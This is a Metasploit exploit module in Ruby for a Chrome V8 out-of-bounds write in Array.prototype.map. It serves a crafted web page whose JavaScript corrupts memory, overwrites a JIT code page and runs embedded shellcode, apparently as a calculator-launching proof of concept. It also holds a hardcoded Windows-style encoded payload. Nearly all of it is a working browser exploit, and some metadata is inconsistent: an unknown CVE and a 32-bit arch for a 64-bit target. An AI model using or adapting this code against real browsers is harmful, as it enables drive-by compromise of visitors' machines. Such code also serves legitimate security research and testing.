##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "Chrome OOB write in Array.prototype.map builtin Exploit",
            'Description'    => %q{
              This module exploits the memory corruption vulnerability (CVE-2017-????)
              present in Array.prototype.map builtin of Chrome. It was tested on Chrome 60.0.3080.0 (Linux_x64_466834_chrome-linux)
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'halbecaf (Chrome Security Team @ Google)',       # Original RE research and exploitation
                'Hwiwon Lee <develacker[at]gmail.com>'            # Metasploit module
              ],
            'Platform'       => 'linux',
            'Targets'        =>
              [
                [ 'Automatic', {} ],
                [ 'Chrome 60.0.3080.0 on Linux 64bit', { } ],
              ],
            'References'     =>
              [
                [ 'CVE', '2017-????' ],         # Unknown
                [ 'CBT', '716044' ]             # Chromium Bug Tracker (https://bugs.chromium.org/p/chromium/issues/detail?id=716044)
              ],
            'Arch'           => ARCH_X86,
            'DisclosureDate' => "April 28 2017",
            'DefaultTarget'  => 0
          )
        )
    end

    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3080.0 Safari/537.36
    def get_target(agent)
      return target if target.name != 'Automatic'
  
      li = agent.scan(/Linux ((x|i)\d+_*\d*)/).flatten[0] || ""
      cm = agent.scan(/Chrome\/(\d+.\d+.\d+.\d+)/).flatten[0] || ""
  
      cm_name = "Chrome #{cm}"

      case li
      when 'x86_64'
        os_name = 'Linux 64bit'
      when 'i686'
        os_name = 'Linux 32bit'
      end
  
      targets.each do |t|
        if (!cm.empty? && (!li.empty? && t.name.include?(os_name)))
        return t
        end
      end
  
      nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = "%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065"
      
      rop_payload
    end

    def get_html(t)
      # js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))
      js_p = get_payload(t)

      html = <<-HTML
        <html>
        <script>
            var oob_rw = null;
            var leak = null;
            var arb_rw = null;

            var code = function() {
            return 1;
            }
            code();

            class BuggyArray extends Array {
            constructor(len) {
                super(1);
                oob_rw = new Array(1.1, 1.1);
                leak = new Array(code);
                arb_rw = new ArrayBuffer(4);
            }
            };

            class MyArray extends Array {
            static get [Symbol.species]() {
                return BuggyArray;
            }
            }

            var convert_buf = new ArrayBuffer(8);
            var float64 = new Float64Array(convert_buf);
            var uint8 = new Uint8Array(convert_buf);
            var uint32 = new Uint32Array(convert_buf);

            function Uint64Add(dbl, to_add_int) {
            float64[0] = dbl;
            var lower_add = uint32[0] + to_add_int;
            if (lower_add > 0xffffffff) {
                lower_add &= 0xffffffff;
                uint32[1] += 1;
            }
            uint32[0] = lower_add;
            return float64[0];
            }

            // Memory layout looks like this:
            // ================================================================================
            // |a_ BuggyArray (0x80) | a_ FixedArray (0x18) | oob_rw JSArray (0x30)           |
            // --------------------------------------------------------------------------------
            // |oob_rw FixedDoubleArray (0x20) | leak JSArray (0x30) | leak FixedArray (0x18) |
            // --------------------------------------------------------------------------------
            // |arb_rw ArrayBuffer |
            // ================================================================================
            var myarray = new MyArray();
            myarray.length = 9;
            myarray[4] = 42;
            myarray[8] = 42;
            myarray.map(function(x) { return 1000000; });

            var js_function_addr = oob_rw[10];  // JSFunction for code()

            // Set arb_rw's kByteLengthOffset to something big.
            uint32[0] = 0;
            uint32[1] = 1000000;
            oob_rw[14] = float64[0];
            // Set arb_rw's kBackingStoreOffset to
            // js_function_addr + JSFunction::kCodeEntryOffset - 1
            // (to get rid of Object tag)
            oob_rw[15] = Uint64Add(js_function_addr, 56-1);

            var js_function_uint32 = new Uint32Array(arb_rw);
            uint32[0] = js_function_uint32[0];
            uint32[1] = js_function_uint32[1];
            oob_rw[15] = Uint64Add(float64[0], 128); // 128 = code header size

            // pop /usr/bin/xcalc
            var shellcode = new Uint32Array(arb_rw);
            shellcode[0] = 0x90909090;
            shellcode[1] = 0x90909090;
            shellcode[2] = 0x782fb848;
            shellcode[3] = 0x636c6163;
            shellcode[4] = 0x48500000;
            shellcode[5] = 0x73752fb8;
            shellcode[6] = 0x69622f72;
            shellcode[7] = 0x8948506e;
            shellcode[8] = 0xc03148e7;
            shellcode[9] = 0x89485750;
            shellcode[10] = 0xd23148e6;
            shellcode[11] = 0x3ac0c748;
            shellcode[12] = 0x50000030;
            shellcode[13] = 0x4944b848;
            shellcode[14] = 0x414c5053;
            shellcode[15] = 0x48503d59;
            shellcode[16] = 0x3148e289;
            shellcode[17] = 0x485250c0;
            shellcode[18] = 0xc748e289;
            shellcode[19] = 0x00003bc0;
            shellcode[20] = 0x050f00;
            code();
        </script>
        </html>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
        agent = request.headers['User-Agent']
        print_status("Requesting: #{request.uri}")

        target = get_target(agent)
        if target.nil?
        print_error("Browser not supported, sending 404: #{agent}")
        send_not_found(cli)
        return
        end

        print_status("Target selected as: #{target.name}")
        html = get_html(target)
        send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end
